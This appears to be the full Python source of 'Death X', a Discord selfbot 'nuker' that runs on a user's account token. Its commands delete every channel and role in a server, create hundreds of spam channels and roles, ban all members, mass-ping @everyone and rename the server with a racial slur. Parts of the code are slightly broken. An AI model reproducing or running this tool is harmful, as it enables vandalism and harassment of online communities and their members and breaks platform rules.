import discord, colorama, requests, asyncio, urllib
from urllib import parse, request
from colorama import init, Fore
from discord.ext import commands

init(convert=True) #needed so that users using below versions of windows 10 can see the color such as windows xp vista7 ,8

print(f"""
▓█████▄ ▓█████ ▄▄▄     ▄▄▄█████▓ ██░ ██    ▒██   ██▒
▒██▀ ██▌▓█   ▀▒████▄   ▓  ██▒ ▓▒▓██░ ██▒   ▒▒ █ █ ▒░
░██   █▌▒███  ▒██  ▀█▄ ▒ ▓██░ ▒░▒██▀▀██░   ░░  █   ░
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██░ ▓██▓ ░ ░▓█ ░██     ░ █ █ ▒        {Fore.MAGENTA}v0.2{Fore.RESET}
░▒████▓ ░▒████▒▓█   ▓██▒ ▒██▒ ░ ░▓█▒░██▓   ▒██▒ ▒██▒
 ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒ ░░    ▒ ░░▒░▒   ▒▒ ░ ░▓ ░
 ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░   ░     ▒ ░▒░ ░   ░░   ░▒ ░
 ░ ░  ░    ░    ░   ▒    ░       ░  ░░ ░    ░    ░  
   ░       ░  ░     ░  ░         ░  ░  ░    ░    ░  
 ░                                                  
""")
print(f"""{Fore.GREEN}THE {Fore.RESET}{Fore.RED}DEATH X{Fore.RESET}{Fore.GREEN} SELFBOT NUKER
""")
print(f"{Fore.RED}This script is under MIT license and was originally made by jxd don't skid it")
print("")
print(f"{Fore.BLUE}")
print("       [?] Type {prefix}help to get all commands")

p = input("Prefix: ")
deathx = commands.Bot(command_prefix=p, self_bot=True, help_command=None)
token = input(f"{Fore.RED}Your Token: {Fore.RESET}")
print(Fore.GREEN + "Don't worry I'm not a 11 year old skid")

@deathx.event
async def on_ready():
 print("Logged in the user")

@deathx.command()
async def spam(ctx, amount: int, *, message):

    await ctx.message.delete()

    for _i in range(amount):

        await ctx.send(message)


@deathx.command()
async def spamall(ctx, num, *, message):

    await ctx.message.delete()

    num = int(num)

    for a in range(num):

        for channel in ctx.guild.channels:

            await channel.send(message)
    print("[+] Sent a message to a channel")

@deathx.command()
async def nuke(ctx):

    await ctx.message.delete()

    print("\n=======================")

    print("DELETING CHANELS...")

    print("=======================\n")

    i = 0

    for c in ctx.guild.channels:

    	i = i + 1

    	await c.delete()

    	print(f"[-] channel deleted, {i} done")
	
    print("\n=======================")

    print("CREATING CHANELS...")

    print("=======================\n")

    for i in range(500):

    	guild = ctx.message.guild

    	await guild.create_text_channel("death x on top")

    	print(f"[+] channel created, {i} done")

@deathx.command()
async def clear(ctx):

    await ctx.message.delete()

    print("\n=======================")

    print("DELETING CHANELS...")

    print("=======================\n")

    i = 0
    for c in ctx.guild.channels:

    	i = i + 1

    	await c.delete()

    	print(f"[-] channel deleted, {i} done")

    print("Done !")

    await ctx.guild.create_text_channel("death x")
    print("Done clearing channels")
    await ctx.send("@everyone DEATH X ON TOP")

@deathx.command()
async def invite(ctx):
    await ctx.message.delete()

    await ctx.send("This selfbot will be released soon...")

@deathx.command()
async def logout(ctx):
    await ctx.bot.logout()
    print(Fore.RED + "shutdowned the selfbot")

@deathx.command()
async def terminate(ctx):  
    await ctx.message.delete()
    print(f"Nuking the guild.")
    for channel in ctx.guild.channels:
        try:
           await channel.delete()
           print(Fore.GREEN+f"[-] CHANNEL: {channel} deleted")
        except:
           print(Fore.RED+f"[x] CHANNEL: Couldn't delete {channel}")
    for role in ctx.guild.roles:
        try:
            await ctx.role.delete()
            print(Fore.GREEN+f"[-] ROLE: {role} deleted")
        except:
            print(Fore.RED+f"[x] ROLE: Couldn't delete {role}")
    await ctx.guild.edit(default_notifications=discord.NotificationLevel.all_messages,verification_level=discord.VerificationLevel.extreme ,name="CHING CHONG", icon=None)
    for x in range(500):
        await ctx.guild.create_text_channel(name="WIZZED BY DEATH X")
        await ctx.guild.create_voice_channel(name="WIZZED BY DEATH X")
        await ctx.guild.create_category(name="WIZZED BY DEATH X")
    for x in range(500):
        await ctx.guild.create_role(name="WIZZED BY DEATH X")
    return

@deathx.command()
async def renamechannels(ctx, *, name):

    await ctx.message.delete()

    for channel in ctx.guild.channels:

        await channel.edit(name=name)

        print(Fore.GREEN+f"[=] CHANNEL: Renamed {channel}")

@deathx.command()
async def banall(ctx):

    await ctx.message.delete()

    for user in ctx.guild.members:

        try:

            await user.ban(reason="Death X Reason: Banned by death x selfbot")
            print(f"[!] BAN: {member} was banned")

        except:

            pass

@deathx.command(aliases=['serverpfp', 'servericon'])
async def guildicon(ctx):

    await ctx.message.delete()

    em = discord.Embed(title=ctx.guild.name)

    em.set_image(url=ctx.guild.icon_url)

    await ctx.send(embed=em)

@deathx.command(aliases=['bigtext'])
async def ascii(ctx, *, text):

    await ctx.message.delete()

    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text

    if len('```' + r + '```') > 2000:

        return

    await ctx.send(f"```{r}```")


@deathx.command(aliases=['serverbanner'])

async def banner(ctx):

    await ctx.message.delete()

    em = discord.Embed(title=ctx.guild.name)

    em.set_image(url=ctx.guild.banner_url)

    await ctx.send(embed=em)


@deathx.command(aliases=["copyguild", "copyserver"])

async def copy(ctx):
    await ctx.message.delete()

    await deathx.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)

    for g in deathx.guilds:

       if f'backup-{ctx.guild.name}' in g.name:

            for c in g.channels:

                await c.delete()

            for cate in ctx.guild.categories:

                x = await g.create_category(f"{cate.name}")

                for chann in cate.channels:

                    if isinstance(chann, discord.VoiceChannel):

                        await x.create_voice_channel(f"{chann}")

                    if isinstance(chann, discord.TextChannel):

                        await x.create_text_channel(f"{chann}")

    try:

        await g.edit(icon=ctx.guild.icon_url)

    except:

        pas


@deathx.command(pass_context=True)

async def help(ctx):

    await ctx.message.delete()

    author = ctx.message.author


    embed = discord.Embed(
        colour = discord.Colour.red()
    )


    embed.set_author(name='<<DEATH X HELP MENU>>')
    embed.add_field(name='clear', value='Clears all channels', inline=False)
    embed.add_field(name='invite', value='Returns invite link of the selfbot', inline=False)

    embed.add_field(name='nuke', value='Nukes the server where the command is executed', inline=False)
    embed.add_field(name='spam <number> <message>', value='Spams on the channel wher eit is executed', inline=False)
    embed.add_field(name='spamall <number> <message>', value='The same as spam but you spam on all the channels in the server it was executed', inline=False)
    embed.add_field(name='banall', value='Bans all the members in the server where it was executed', inline=False)
    embed.add_field(name='terminate', value='2nd version of the nuke command but its more destructive', inline=False)
    embed.add_field(name='renamechannels', value='Renames all the channels', inline=False)
    embed.add_field(name='logout', value='Shuts the selfbot down', inline=False)
    embed.set_footer(text='Page 1/2 | Coded by jxd#1385 and kikiii#9541 | type help {number of page}')
    await ctx.send(author, embed=embed)

@deathx.command(pass_context=True)

async def help2(ctx):

    await ctx.message.delete()

    author = ctx.message.author


    embed = discord.Embed(
        colour = discord.Colour.red()
    )


    embed.set_author(name='<<DEATH X HELP MENU>>')
    embed.add_field(name='guildicon', value='Returns the server pfp', inline=False)
    embed.add_field(name='banner', value='Returns the server banned', inline=False)
    embed.add_field(name='ascii', value='Creates a large text', inline=False)
    embed.add_field(name='copy', value='Copies the whole server', inline=False)
    embed.set_footer(text='Page 2/2 | Coded by jxd#1385 and kikiii#9541')
    await ctx.send(author, embed=embed)



deathx.run(token, bot=False)
